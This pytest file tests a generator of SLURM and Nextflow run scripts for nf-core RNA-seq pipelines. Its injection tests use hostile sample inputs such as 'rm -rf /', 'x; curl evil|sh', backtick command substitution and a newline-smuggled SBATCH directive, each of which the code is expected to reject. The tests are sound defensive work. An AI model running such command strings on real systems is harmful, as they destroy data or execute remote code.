from pathlib import Path

import pytest

from chat_nextseek.luria.run_script import (
    validate_resources,
    sanitize_job_name,
    render_run_script,
)


def test_validate_resources_defaults_when_empty():
    assert validate_resources({}) == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "128G"}


def test_validate_resources_accepts_valid_overrides():
    out = validate_resources({"partition": "high", "time": "12:00:00", "cpus": 8, "mem": "64G"})
    assert out == {"partition": "high", "time": "12:00:00", "cpus": "8", "mem": "64G"}


def test_validate_resources_rejects_bad_values_falls_back():
    out = validate_resources({"partition": "bad; rm -rf /", "time": "lots", "cpus": 999, "mem": "8GB"})
    assert out == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "128G"}


def test_validate_resources_rejects_trailing_newline():
    out = validate_resources({"partition": "bcc\n", "time": "12:00:00\n", "mem": "64G\n"})
    assert out == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "128G"}


def test_validate_resources_non_dict_falls_back():
    assert validate_resources(["not", "a", "dict"]) == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "128G"}


def test_sanitize_job_name_strips_shell_chars():
    assert sanitize_job_name("rnaseq; rm -rf /") == "rnaseq_rm_-rf"
    assert sanitize_job_name("") == "nfcore_run"


def test_render_substitutes_all_slots_and_no_tokens_left():
    script = render_run_script(
        job_name="nfcore_rnaseq", pipeline="nf-core/rnaseq", revision="3.16.1",
        run_dir="/net/x/runs/nfcore_rnaseq_260709", genome="GRCm39",
        work_dir="/net/x/work/nfcore_rnaseq", singularity_cache="/net/x/singularity_cache",
        resources={},
    )
    assert "#SBATCH --job-name=nfcore_rnaseq" in script
    assert "#SBATCH -n 16\n#SBATCH --mem=128G\n" in script  # default cpus, 8 GB per CPU
    assert "#SBATCH -p bcc" in script                     # default partition (not the busy 'normal')
    assert "#SBATCH --output=/net/x/runs/nfcore_rnaseq_260709/nfcore_rnaseq.out" in script
    assert "conda activate cdemu_nfcore" in script        # default; LURIA_CONDA_ENV overrides
    assert "module add singularity/3.10.4" in script
    assert "cd /net/x/runs/nfcore_rnaseq_260709" in script
    assert "nextflow run nf-core/rnaseq -r 3.16.1 -profile singularity" in script
    assert "-c luria.config" in script                    # local reference genomes
    assert "-params-file params.yml" in script            # curated per-pipeline params
    assert "--input samplesheet.csv" in script
    assert "--genome GRCm39" in script          # threaded, not hardcoded
    assert "-w /net/x/work/nfcore_rnaseq" in script
    assert "export NXF_SINGULARITY_CACHEDIR=/net/x/singularity_cache" in script
    assert "export NXF_SYNTAX_PARSER=v1" in script        # legacy parser for nf-core configs
    # CA bundle for singularity TLS (compute nodes lack the Let's Encrypt root)
    assert 'export SSL_CERT_FILE="$(dirname /net/x/singularity_cache)/certs/ca-bundle.crt"' in script
    assert "{{" not in script and "}}" not in script


def test_validate_revision_accepts_normal_revisions():
    from chat_nextseek.luria.run_script import validate_revision
    for r in ("3.21.0", "main", "a1b2c3d", "dev/branch-1"):
        assert validate_revision(r) == r


def test_validate_revision_rejects_shell_metacharacters():
    from chat_nextseek.luria.run_script import validate_revision
    for bad in ("x; rm -rf /", "main | sh", "v1 -c /tmp/e.config", "a\nb", "`id`"):
        with pytest.raises(ValueError):
            validate_revision(bad)


def test_render_run_script_rejects_injected_revision():
    with pytest.raises(ValueError):
        render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="x; curl evil|sh",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="GRCh38", resources={})


def test_validate_genome_accepts_igenomes_keys():
    from chat_nextseek.luria.run_script import validate_genome
    for g in ("GRCh38", "GRCm39", "R64-1-1", "WBcel235", "Mmul_10"):
        assert validate_genome(g) == g


def test_validate_genome_rejects_injection():
    from chat_nextseek.luria.run_script import validate_genome
    for bad in ("GRCh38; rm -rf /", "x`id`", "a b", "", "g\n"):
        with pytest.raises(ValueError):
            validate_genome(bad)


def test_render_run_script_rejects_injected_genome():
    with pytest.raises(ValueError):
        render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="3.16.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c",
                          genome="GRCh38; curl evil|sh", resources={})


def test_render_luria_config_substitutes_refs_root():
    from chat_nextseek.luria.run_script import render_luria_config
    cfg = render_luria_config("/net/bmc-pub10/data1/bmc/pipeline_cd/refs")
    assert "{{REFS_ROOT}}" not in cfg
    # every genome key resolves to a local file under the refs root
    assert "/net/bmc-pub10/data1/bmc/pipeline_cd/refs/GRCh38.primary_assembly.genome.fa.gz" in cfg
    assert "/net/bmc-pub10/data1/bmc/pipeline_cd/refs/gencode.vM39.basic.annotation.gtf.gz" in cfg
    assert "'Mfas6.0'" in cfg and "'Mmul_10'" in cfg


def test_render_luria_config_strips_trailing_slash():
    from chat_nextseek.luria.run_script import render_luria_config
    cfg = render_luria_config("/net/x/refs/")
    assert "/net/x/refs/GRCh38.primary_assembly.genome.fa.gz" in cfg
    assert "/net/x/refs//GRCh38" not in cfg


def test_render_luria_config_pins_process_shell_as_a_list():
    # Newer nf-core templates set process.shell to a multi-line string; Nextflow 26.04 pastes
    # it into the container launch verbatim, so bash runs .command.run as a program and every
    # task exits 126 (seen on Luria, rnaseq 3.22). The list form is what fetchngs 1.12 uses.
    from chat_nextseek.luria.run_script import render_luria_config
    cfg = render_luria_config("/net/x/refs")
    assert "process.shell = ['/bin/bash', '-euo', 'pipefail']" in cfg


def test_render_luria_config_rejects_bad_refs_root():
    from chat_nextseek.luria.run_script import render_luria_config
    for bad in ("", "/net/x; rm -rf /", "a b", "x`id`"):
        with pytest.raises(ValueError):
            render_luria_config(bad)


def test_render_run_script_injects_fasta_gtf_for_known_genome():
    s = render_run_script(job_name="j", pipeline="nf-core/scrnaseq", revision="2.7.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="Mfas6.0",
                          resources={}, refs_root="/net/x/refs")
    assert "--fasta /net/x/refs/Macaca_fascicularis.Macaca_fascicularis_6.0.dna.toplevel.fa.gz" in s
    assert "--gtf /net/x/refs/Macaca_fascicularis.Macaca_fascicularis_6.0.116.gtf.gz" in s
    assert "--genome Mfas6.0" in s   # kept alongside the explicit paths
    # Without it --genome also pulls iGenomes' prebuilt indexes, which an explicit
    # --fasta/--gtf does not replace: rnaseq 3.22 then aligned with iGenomes' old
    # STARIndex ("Genome version: 20201 is INCOMPATIBLE"; seen on Luria).
    assert "--igenomes_ignore" in s
    assert "{{" not in s and "}}" not in s


def test_render_run_script_no_fasta_gtf_for_unregistered_genome():
    # a genome not in LURIA_GENOMES has no local refs -> no --fasta/--gtf (falls back to --genome)
    s = render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="3.16.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="R64-1-1",
                          resources={}, refs_root="/net/x/refs")
    assert "--fasta" not in s and "--gtf" not in s
    assert "--igenomes_ignore" not in s   # iGenomes is then the only source of references
    assert "--genome R64-1-1" in s and "{{" not in s


def test_genome_ref_paths():
    from chat_nextseek.luria.run_script import genome_ref_paths
    f, g = genome_ref_paths("GRCm39", "/net/x/refs/")
    assert f == "/net/x/refs/GRCm39.primary_assembly.genome.fa.gz"
    assert g == "/net/x/refs/gencode.vM39.basic.annotation.gtf.gz"
    assert genome_ref_paths("NOPE", "/net/x/refs") == (None, None)


def test_render_process_config():
    from chat_nextseek.luria.run_script import render_process_config
    cfg = render_process_config({"SIMPLEAF_QUANT": "--knee"})
    assert "withName: '.*:SIMPLEAF_QUANT'" in cfg and "ext.args = '--knee'" in cfg
    assert render_process_config({}) == "" and render_process_config(None) == ""
    with pytest.raises(ValueError):
        render_process_config({"BAD; rm -rf /": "--knee"})            # unsafe process name
    with pytest.raises(ValueError):
        render_process_config({"SIMPLEAF_QUANT": "--knee'; rm -rf /"})  # unsafe ext.args
    with pytest.raises(ValueError):
        # STAR_ALIGN has a non-empty pipeline ext.args default -> overriding would clobber it;
        # the renderer refuses (STAR cell-calling is tuned via samplesheet expected_cells, not here).
        render_process_config({"STAR_ALIGN": "--soloCellFilter EmptyDrops_CR"})


# --- Phase 2: per-aligner vendored-pipeline source selection ---

def test_resolve_pipeline_source_star_uses_vendored_clone_no_revision():
    from chat_nextseek.luria.run_script import resolve_pipeline_source
    source, flag = resolve_pipeline_source(
        "nf-core/scrnaseq", "star", "2.7.1", "/net/bmc-pub10/data1/bmc/pipeline_cd")
    assert source == "/net/bmc-pub10/data1/bmc/pipeline_cd/pipelines/scrnaseq-2.7.1-star-patched"
    # a `-r <tag>` on a local git clone would checkout the tag and WIPE the patches
    assert flag == ""


def test_resolve_pipeline_source_stock_when_aligner_not_registered():
    from chat_nextseek.luria.run_script import resolve_pipeline_source
    source, flag = resolve_pipeline_source(
        "nf-core/scrnaseq", "alevin", "2.7.1", "/net/bmc-pub10/data1/bmc/pipeline_cd")
    assert source == "nf-core/scrnaseq"
    assert flag == "-r 2.7.1"


def test_resolve_pipeline_source_normalizes_github_url():
    from chat_nextseek.luria.run_script import resolve_pipeline_source
    for pipeline in ("https://github.com/nf-core/scrnaseq", "https://github.com/nf-core/scrnaseq.git"):
        source, flag = resolve_pipeline_source(pipeline, "star", "2.7.1", "/net/x")
        assert source == "/net/x/pipelines/scrnaseq-2.7.1-star-patched"
        assert flag == ""


def test_resolve_pipeline_source_stock_when_no_working():
    # without a working path we cannot build the clone path -> fall back to stock
    from chat_nextseek.luria.run_script import resolve_pipeline_source
    source, flag = resolve_pipeline_source("nf-core/scrnaseq", "star", "2.7.1", None)
    assert source == "nf-core/scrnaseq" and flag == "-r 2.7.1"


def test_render_run_script_star_points_at_vendored_clone_no_r():
    s = render_run_script(job_name="j", pipeline="nf-core/scrnaseq", revision="2.7.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="Mfas6.0",
                          resources={}, refs_root="/net/x/refs", aligner="star",
                          working="/net/bmc-pub10/data1/bmc/pipeline_cd")
    assert ("nextflow run /net/bmc-pub10/data1/bmc/pipeline_cd/pipelines/scrnaseq-2.7.1-star-patched "
            "-profile singularity") in s
    assert "-r 2.7.1" not in s          # local clone: NO -r (would wipe the patches)
    assert "{{" not in s and "}}" not in s


def test_render_run_script_alevin_uses_stock_remote_with_r():
    s = render_run_script(job_name="j", pipeline="nf-core/scrnaseq", revision="2.7.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="Mfas6.0",
                          resources={}, refs_root="/net/x/refs", aligner="alevin",
                          working="/net/bmc-pub10/data1/bmc/pipeline_cd")
    assert "nextflow run nf-core/scrnaseq -r 2.7.1 -profile singularity" in s
    assert "/pipelines/scrnaseq-2.7.1-star-patched" not in s


# --- operator-specific slots (mail user / conda env) -------------------------
# Both were hardcoded to one operator's values in the template; they are now
# env-driven and allow-listed fail-closed like every other slot.

def _script(**over):
    kwargs = dict(
        job_name="j", pipeline="nf-core/rnaseq", revision="3.16.1",
        run_dir="/net/x/runs/j", genome="GRCm39",
        work_dir="/net/x/work/j", singularity_cache="/net/x/cache",
        resources={},
    )
    kwargs.update(over)
    return render_run_script(**kwargs)


def test_mail_directives_omitted_when_unset(monkeypatch):
    """No LURIA_MAIL_USER -> no mail directives at all.

    Defaulting this would mail another operator's runs to whoever was hardcoded.
    """
    monkeypatch.delenv("LURIA_MAIL_USER", raising=False)
    script = _script()
    assert "--mail-user" not in script
    assert "--mail-type" not in script


def test_mail_directives_rendered_when_set(monkeypatch):
    monkeypatch.setenv("LURIA_MAIL_USER", "someone@mit.edu")
    script = _script()
    assert "#SBATCH --mail-type=END" in script
    assert "#SBATCH --mail-user=someone@mit.edu" in script


def test_mail_user_is_allow_listed(monkeypatch):
    monkeypatch.setenv("LURIA_MAIL_USER", "evil@x.edu\n#SBATCH --wckey=pwn")
    with pytest.raises(ValueError):
        _script()


def test_conda_env_overridable(monkeypatch):
    monkeypatch.setenv("LURIA_CONDA_ENV", "other_nfcore")
    script = _script()
    assert "conda activate other_nfcore" in script
    assert "cdemu_nfcore" not in script


def test_conda_env_is_allow_listed(monkeypatch):
    monkeypatch.setenv("LURIA_CONDA_ENV", "x; rm -rf /")
    with pytest.raises(ValueError):
        _script()


from chat_nextseek.luria.run_script import has_local_luria_ref, local_luria_ref_files


def test_has_local_luria_ref_true_for_registered_keys():
    for key in ("GRCh38", "GRCm39", "Mfas6.0", "Mmul_10"):
        assert has_local_luria_ref(key) is True


def test_has_local_luria_ref_false_for_unregistered_or_none():
    assert has_local_luria_ref("GRCz11") is False
    assert has_local_luria_ref(None) is False
    assert has_local_luria_ref("") is False


def test_local_luria_ref_files_returns_filenames_or_none():
    files = local_luria_ref_files("Mfas6.0")
    assert files["fasta"].endswith(".fa.gz") and files["gtf"].endswith(".gtf.gz")
    assert local_luria_ref_files("GRCz11") is None


# --- Task 7: fetchngs pre-block rendered into run.sh --------------------------

def _render(**over):
    kw = dict(job_name="j", pipeline="nf-core/rnaseq", revision="3.18.0",
              run_dir="/w/runs/j", work_dir="/w/work/j", singularity_cache="/w/sc",
              genome="GRCm39", resources=None, refs_root="/w/refs")
    kw.update(over)
    return render_run_script(**kw)


def test_render_no_fetch_block_by_default():
    out = _render()
    assert "fetchngs" not in out
    assert "nextflow run nf-core/rnaseq -r 3.18.0" in out   # pipeline block intact


def test_render_includes_fetch_block_when_needed():
    out = _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0")
    assert "nextflow run nf-core/fetchngs -r 1.12.0" in out
    assert "fetchngs_helpers.py ids" in out
    assert "fetchngs_helpers.py fill" in out
    assert "/w/fastq_cache" in out
    assert "nextflow run nf-core/rnaseq -r 3.18.0" in out   # pipeline block STILL intact + unchanged


def test_render_fetch_block_binds_etc_for_container_dns():
    # nextflow ignores $SINGULARITY_BIND, so the host-/etc bind goes via singularity.runOptions
    # in a -c config (verified end-to-end on Luria).
    out = _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0")
    assert "singularity.runOptions = '-B /etc'" in out
    assert "-c fetchngs.config" in out


def test_render_fetch_block_fails_fast_on_fetch_or_fill_error():
    # A failed download or fill must abort run.sh, not fall through to a doomed pipeline run.
    out = _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0")
    assert out.count("exit 1") >= 2                       # guards on both the fetch and the fill


def test_render_fetch_block_cache_check_uses_the_fill_matcher():
    # A substring glob counted SRR1 as cached when only SRR10's files were there; the shell
    # now asks the helper, so "cached" means exactly what fill can resolve.
    out = _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0")
    assert 'fetchngs_helpers.py cached "$CACHE"' in out
    assert '"${acc}"' not in out


def test_render_fetch_block_rejects_bad_cache():
    with pytest.raises(ValueError):
        _render(needs_fetch=True, fastq_cache="/w; rm -rf /", fetchngs_revision="1.12.0")


def test_render_fetch_block_rejects_bad_revision():
    with pytest.raises(ValueError):
        _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0; evil")


# --- per-pipeline launch settings: nf-core/rnavar 1.3.0 ------------------------
# The first rnavar run on Luria needed three hand fixes before alignment started:
# rnavar's schema rejects a .gtf.gz (pattern ^\S+\.gtf$); with a .fa.gz its
# GUNZIP_FASTA never got a task and the run "completed" with no BAM or VCF; and
# under the v2 parser the run used, a bare CLI --igenomes_ignore reached
# validation as the string "true". Every other pipeline keeps its old launch.

def _rnavar(**over):
    kw = dict(job_name="j", pipeline="nf-core/rnavar", revision="1.3.0",
              run_dir="/r", work_dir="/w", singularity_cache="/c", genome="GRCh38",
              resources={}, refs_root="/net/x/refs")
    kw.update(over)
    return render_run_script(**kw)


def test_rnavar_runs_on_uncompressed_fasta_and_gtf():
    s = _rnavar()
    assert "--fasta /net/x/refs/GRCh38.primary_assembly.genome.fa " in s
    assert "--gtf /net/x/refs/gencode.v46.basic.annotation.gtf " in s
    assert ".gz" not in s


def test_rnavar_uses_the_v2_parser_and_no_cli_igenomes_ignore():
    s = _rnavar()
    assert "export NXF_SYNTAX_PARSER=v2" in s
    assert "NXF_SYNTAX_PARSER=v1" not in s
    # under v2 a bare boolean CLI flag reaches nf-schema as the string "true";
    # igenomes_ignore travels in params.yml instead (luria_params_overrides)
    assert "--igenomes_ignore" not in s
    assert "{{" not in s and "}}" not in s


def test_rnavar_profile_matches_github_url_and_bare_key():
    for name in ("https://github.com/nf-core/rnavar", "https://github.com/nf-core/rnavar.git"):
        s = _rnavar(pipeline=name)
        assert "export NXF_SYNTAX_PARSER=v2" in s and ".gz" not in s
    from chat_nextseek.luria.run_script import local_luria_ref_files
    assert local_luria_ref_files("GRCh38", pipeline="rnavar") == {
        "fasta": "GRCh38.primary_assembly.genome.fa",
        "gtf": "gencode.v46.basic.annotation.gtf"}


def test_rnaseq_and_scrnaseq_launch_unchanged():
    for pipeline, rev in (("nf-core/rnaseq", "3.22.2"), ("nf-core/scrnaseq", "2.7.1")):
        s = _rnavar(pipeline=pipeline, revision=rev)
        assert "export NXF_SYNTAX_PARSER=v1" in s
        assert ("--fasta /net/x/refs/GRCh38.primary_assembly.genome.fa.gz "
                "--gtf /net/x/refs/gencode.v46.basic.annotation.gtf.gz --igenomes_ignore") in s
    from chat_nextseek.luria.run_script import local_luria_ref_files
    assert local_luria_ref_files("GRCh38", pipeline="rnaseq")["gtf"].endswith(".gtf.gz")


def test_luria_params_overrides_only_for_v2_pipelines_with_local_refs():
    from chat_nextseek.luria.run_script import luria_params_overrides
    assert luria_params_overrides("nf-core/rnavar", "GRCh38") == {"igenomes_ignore": True}
    assert luria_params_overrides("nf-core/rnavar", "R64-1-1") == {}   # no local refs: iGenomes
    assert luria_params_overrides("nf-core/rnaseq", "GRCh38") == {}    # flag stays on the CLI


def test_rnavar_unregistered_genome_still_falls_back_to_igenomes():
    s = _rnavar(genome="R64-1-1")
    assert "--fasta" not in s and "--gtf" not in s and "--igenomes_ignore" not in s
    assert "--genome R64-1-1" in s


def test_genome_ref_paths_uncompressed():
    from chat_nextseek.luria.run_script import genome_ref_paths
    f, g = genome_ref_paths("Mmul_10", "/net/x/refs", uncompressed=True)
    assert f == "/net/x/refs/Macaca_mulatta.Mmul_10.dna.toplevel.fa"
    assert g == "/net/x/refs/Macaca_mulatta.Mmul_10.116.gtf"


# --- SLURM allocation -> Nextflow local executor limits ------------------------------------
# One SLURM job runs every task through Nextflow's local executor. Unless told otherwise the
# executor sizes itself to the whole node (Luria does not confine the job: nproc = 96), and the
# first rnavar 1.3.0 run collapsed when ~50 scattered GATK JVMs exhausted the node's per-user
# process limit (seen on Luria, 2026-10-20). luria.config must carry the same allocation that
# run.sh requests.

from chat_nextseek.luria.run_script import (  # noqa: E402
    nextflow_executor_limits, render_executor_config, render_luria_config,
)

_GOLDEN = Path(__file__).parent / "fixtures" / "luria_render"


def test_default_memory_scales_with_cpus_at_8_gb_per_cpu():
    assert validate_resources({"cpus": 4})["mem"] == "32G"
    assert validate_resources({"cpus": 16})["mem"] == "128G"
    assert validate_resources({"cpus": 32})["mem"] == "256G"


def test_default_memory_is_capped_below_one_bcc_node():
    # One bcc node seen by Nextflow: 96 CPUs, 376.6 GB. 64 CPUs x 8 GB would ask for more.
    assert validate_resources({"cpus": 64})["mem"] == "320G"


def test_explicit_memory_is_kept():
    assert validate_resources({"cpus": 8, "mem": "64G"})["mem"] == "64G"
    assert validate_resources({"cpus": 8, "mem": "9216M"})["mem"] == "9216M"


def test_memory_too_small_for_nextflow_falls_back_to_the_per_cpu_default():
    for small in ("0G", "2G", "512M", "3000M"):
        assert validate_resources({"cpus": 8, "mem": small})["mem"] == "64G", small


def test_executor_limits_leave_room_below_sbatch_mem_for_nextflow():
    # the hand fix applied to the rnavar run: --mem=128G, executor 16 CPUs / 120 GB
    assert nextflow_executor_limits(validate_resources({})) == {"cpus": 16, "memory_gb": 120}
    assert nextflow_executor_limits(validate_resources({"cpus": 8, "mem": "64G"})) == \
        {"cpus": 8, "memory_gb": 60}
    assert nextflow_executor_limits(validate_resources({"cpus": 2, "mem": "9216M"})) == \
        {"cpus": 2, "memory_gb": 7}
    assert nextflow_executor_limits(validate_resources({"cpus": 1, "mem": "4G"})) == \
        {"cpus": 1, "memory_gb": 2}


def test_executor_limits_validate_their_input():
    # raw, unvalidated input goes through validate_resources first
    assert nextflow_executor_limits({"cpus": 999, "mem": "8GB"}) == {"cpus": 16, "memory_gb": 120}


def test_render_executor_config_sets_executor_and_per_task_limits():
    block = render_executor_config({"cpus": 8, "mem": "64G"})
    assert "executor {\n    cpus = 8\n    memory = '60 GB'\n}" in block
    # a label asking for more than the job (process_high_memory, or a retry's attempt x cpus)
    # is clamped to the allocation instead of being refused by the local executor
    assert "process.resourceLimits = [cpus: 8, memory: '60 GB']" in block


def test_luria_config_carries_the_default_allocation():
    cfg = render_luria_config("/net/x/refs")
    assert "executor {\n    cpus = 16\n    memory = '120 GB'\n}" in cfg
    assert "process.resourceLimits = [cpus: 16, memory: '120 GB']" in cfg


def test_luria_config_carries_the_requested_allocation():
    cfg = render_luria_config("/net/x/refs", resources={"cpus": 8, "mem": "64G"})
    assert "executor {\n    cpus = 8\n    memory = '60 GB'\n}" in cfg
    assert "cpus = 16" not in cfg


def test_run_script_requests_the_memory_given():
    s = render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="3.22.2",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="GRCh38",
                          resources={"cpus": 8, "mem": "64G"})
    assert "#SBATCH -n 8\n#SBATCH --mem=64G\n" in s


def _golden_kwargs():
    w = "/net/x"
    common = dict(run_dir=f"{w}/runs/run_1", work_dir=f"{w}/work/run",
                  singularity_cache=f"{w}/singularity_cache", refs_root=f"{w}/refs",
                  working=w, resources={})
    return {
        "rnaseq": dict(common, job_name="run", pipeline="nf-core/rnaseq", revision="3.22.2",
                       genome="GRCh38", aligner="star_salmon"),
        "rnaseq_fetchngs": dict(common, job_name="run", pipeline="nf-core/rnaseq",
                                revision="3.22.2", genome="GRCm39", needs_fetch=True,
                                fastq_cache=f"{w}/fastq_cache"),
        "scrnaseq_star": dict(common, job_name="run", pipeline="nf-core/scrnaseq",
                              revision="2.7.1", genome="Mfas6.0", aligner="star"),
        "rnavar": dict(common, job_name="run", pipeline="nf-core/rnavar", revision="1.3.0",
                       genome="GRCh38", aligner="star"),
    }


@pytest.mark.parametrize("case", sorted(_golden_kwargs()))
def test_run_script_differs_from_before_only_by_the_mem_line(case, monkeypatch):
    # Goldens are the rendered run.sh from before the executor limits were added.
    monkeypatch.delenv("LURIA_MAIL_USER", raising=False)
    monkeypatch.delenv("LURIA_CONDA_ENV", raising=False)
    s = render_run_script(**_golden_kwargs()[case])
    assert s.count("#SBATCH --mem=128G\n") == 1
    assert s.replace("#SBATCH --mem=128G\n", "", 1) == \
        (_GOLDEN / f"{case}.run.sh").read_text(encoding="utf-8")


@pytest.mark.parametrize("case,process_args", [
    ("default", None),
    ("scrnaseq_knee", {"SIMPLEAF_QUANT": "-r cr-like --knee"}),
])
def test_luria_config_differs_from_before_only_by_the_executor_block(case, process_args):
    from chat_nextseek.luria.run_script import render_process_config
    cfg = render_luria_config("/net/x/refs") + render_process_config(process_args)
    block = render_executor_config({})
    assert cfg.count(block) == 1
    assert cfg.replace(block, "", 1) == \
        (_GOLDEN / f"{case}.luria.config").read_text(encoding="utf-8")
